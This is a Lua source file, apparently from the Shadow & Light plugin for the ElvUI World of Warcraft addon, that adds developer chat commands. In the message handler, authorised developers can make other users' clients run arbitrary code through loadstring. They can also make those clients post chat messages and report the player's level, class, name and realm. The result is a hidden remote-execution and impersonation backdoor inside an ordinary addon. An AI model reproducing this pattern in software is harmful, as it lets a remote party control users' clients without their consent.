local E, L, V, P, G, _ = unpack(ElvUI); --Inport: Engine, Locales, PrivateDB, ProfileDB, GlobalDB
local SLE = E:GetModule('SLE');
local find = string.find
local split = string.split

local channel = 'GUILD'
local target = nil;
function E:sleChannel(chnl)
	channel = chnl
	E:Print(format('Developer channel has been changed to %s.', chnl))
end

function E:sleTarget(tgt)
	target = tgt
	E:Print(format('Developer target has been changed to %s.', tgt))
end

function E:sleSays(msg) -- /w Target /slesays {Target|ALL}#channel#message#whispertarget
	if not SLE:CheckFlag(nil, 'SLEAUTHOR') then
		E:Print('You need to be authorized to use this command.')
		return
	end
	--if not SLE:Auth() then return end
	if channel == 'WHISPER' and target == nil then
		E:Print('You need to set a whisper target.')
		return
	end
	SendAddonMessage('SLE_DEV_SAYS', msg, channel, target)
end

function E:sleCommand(msg) -- /w Target /slecmd {Target|ALL}#script
	if not SLE:CheckFlag(nil, 'SLEAUTHOR') then return end
	--if not SLE:Auth() then return end
	if channel == 'WHISPER' and target == nil then
		E:Print('You need to set a whisper target.')
		return
	end
	SendAddonMessage('SLE_DEV_CMD', msg, channel, target)
end

local function SendRecieve(self, event, prefix, message, channel, sender)
	if event == "CHAT_MSG_ADDON" then
		if sender == E.myname then return end
		if SLE:CheckFlag(nil, 'SLEAUTHOR') then return end
		--if SLE:Auth() then return end
		--if (prefix == 'SLE_DEV_SAYS' or prefix == 'SLE_DEV_CMD') and (SLE:CrossAuth(sender) or SLE:Auth()) then
		if (prefix == 'SLE_DEV_SAYS' or prefix == 'SLE_DEV_CMD') and SLE:CheckFlag(sender, 'SLEAUTHOR') then
			if prefix == 'SLE_DEV_SAYS' then
				local user, channel, msg, sendTo = split("#", message)
				
				if (user ~= 'ALL' and user == E.myname) or user == 'ALL' then
					SendChatMessage(msg, channel, nil, sendTo)
				end
			else
				local user, executeString = split("#", message)
				if (user ~= 'ALL' and user == E.myname) or user == 'ALL' then
					local func, err = loadstring(executeString);
					if not err then
						SLE:Print(format("Developer Executed: %s", executeString))
						func()
					end
				end			
			end
		end
		if prefix == 'SLE_DEV_REQ' and SLE:CheckFlag(sender, 'SLEAUTHOR') then
			SendAddonMessage('SLE_DEV_INFO', UnitLevel('player')..'#'..E.myclass..'#'..E.myname..'#'..E.myrealm..'#'..SLE.version, channel)
		end
	end
end
RegisterAddonMessagePrefix('SLE_DEV_SAYS')
RegisterAddonMessagePrefix('SLE_DEV_CMD')

if not SLE:CheckFlag(nil, 'SLEAUTHOR') then
	RegisterAddonMessagePrefix('SLE_DEV_REQ')
end

local f = CreateFrame('Frame', "DaFrame")
f:RegisterEvent("GROUP_ROSTER_UPDATE")
f:RegisterEvent("CHAT_MSG_ADDON")
f:SetScript('OnEvent', SendRecieve)

function SLE:RegisterCommands()
	E:RegisterChatCommand('slesays', 'sleSays')
	E:RegisterChatCommand('slecmd', 'sleCommand')
	E:RegisterChatCommand('sletarget', 'sleTarget')
	E:RegisterChatCommand('slechannel', 'sleChannel')
end